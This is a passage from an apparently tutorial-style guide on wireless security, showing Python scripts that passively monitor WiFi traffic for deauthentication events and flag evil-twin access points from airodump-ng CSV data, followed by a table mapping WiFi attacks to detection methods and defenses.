            prn=monitor.process_packet,
            store=False,
            timeout=timeout,
        )
    except KeyboardInterrupt:
        pass

    summary = monitor.summary()
    print(f"\n=== Monitoring Results ===")
    print(f"APs detected: {summary['total_aps']}")
    print(f"Deauth events: {summary['deauth_events']}")
    print(f"Alerts: {summary['alerts']}")

    if output:
        output.write_text(json.dumps(summary, indent=2, ensure_ascii=False))
        print(f"\n[+] Results saved: {output}")


def main() -> None:
    parser = argparse.ArgumentParser(description="WiFi anomaly detection monitor")
    parser.add_argument("-i", "--interface", required=True, help="Monitor mode interface")
    parser.add_argument("--known-ssids", nargs="*", default=[], help="List of legitimate SSIDs")
    parser.add_argument("-t", "--timeout", type=int, default=60, help="Capture duration (seconds)")
    parser.add_argument("-o", "--output", type=Path)
    args = parser.parse_args()

    monitor_live(args.interface, args.known_ssids, args.timeout, args.output)


if __name__ == "__main__":
    main()
```

---

## 5. Evil Twin Automatic Detection

```python
#!/usr/bin/env python3
"""Evil Twin AP detection — multiple BSSID analysis for same SSID."""

import argparse
import json
from collections import defaultdict
from pathlib import Path


def parse_airodump_csv(csv_path: Path) -> list[dict]:
    """Parse airodump-ng CSV file."""
    aps: list[dict] = []
    in_ap_section = True

    with csv_path.open(encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line:
                in_ap_section = False
                continue
            if line.startswith("BSSID") or line.startswith("Station"):
                continue
            if in_ap_section:
                parts = [p.strip() for p in line.split(",")]
                if len(parts) >= 14:
                    aps.append({
                        "bssid": parts[0],
                        "channel": parts[3].strip(),
                        "privacy": parts[5].strip(),
                        "power": parts[8].strip(),
                        "ssid": parts[13].strip(),
                    })

    return aps


def detect_evil_twin(aps: list[dict]) -> list[dict]:
    """Same SSID with 2+ BSSIDs -> Suspect Evil Twin."""
    ssid_map: dict[str, list[dict]] = defaultdict(list)
    for ap in aps:
        ssid = ap["ssid"]
        if ssid and ssid != "":
            ssid_map[ssid].append(ap)

    suspects = []
    for ssid, ap_list in ssid_map.items():
        if len(ap_list) >= 2:
            # Different channels increase suspicion
            channels = {a["channel"] for a in ap_list}
            suspects.append({
                "ssid": ssid,
                "ap_count": len(ap_list),
                "multi_channel": len(channels) > 1,
                "bssids": [a["bssid"] for a in ap_list],
                "channels": list(channels),
                "risk": "HIGH" if len(channels) > 1 else "MEDIUM",
            })

    return sorted(suspects, key=lambda x: x["ap_count"], reverse=True)


def main() -> None:
    parser = argparse.ArgumentParser(description="Evil Twin AP detection")
    sub = parser.add_subparsers(dest="cmd", required=True)

    csv_p = sub.add_parser("csv", help="Analyze airodump-ng CSV")
    csv_p.add_argument("file", type=Path)
    csv_p.add_argument("-o", "--output", type=Path)

    args = parser.parse_args()

    if args.cmd == "csv":
        aps = parse_airodump_csv(args.file)
        suspects = detect_evil_twin(aps)

        print(f"[*] Total APs: {len(aps)}")
        print(f"[!] Evil Twin suspects: {len(suspects)}\n")

        for s in suspects:
            risk_icon = "[!!]" if s["risk"] == "HIGH" else "[!]"
            print(f"{risk_icon} SSID: {s['ssid']} ({s['ap_count']} APs)")
            print(f"    BSSIDs: {', '.join(s['bssids'])}")
            print(f"    Channels: {', '.join(s['channels'])}")
            print(f"    Risk: {s['risk']}\n")

        if args.output:
            args.output.write_text(json.dumps(suspects, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
```

---

## 6. Defenses

| Attack | Detection Method | Defense Measure |
|--------|-----------------|-----------------|
| Rogue AP | Detect same SSID with multiple BSSIDs | 802.1X EAP auth + certificate pinning |
| Deauth attack | Monitor management frame rate | 802.11w PMF (Protected Management Frames) |
| Beacon flooding | Detect sudden beacon packet spikes | Deploy WIPS solution |
| Captive portal | Detect DNS redirection | HSTS + certificate validation |
| KARMA attack | Monitor probe responses | Minimize preferred network list |
| PMKID attack | Handshake collection without association | Upgrade to WPA3-SAE |
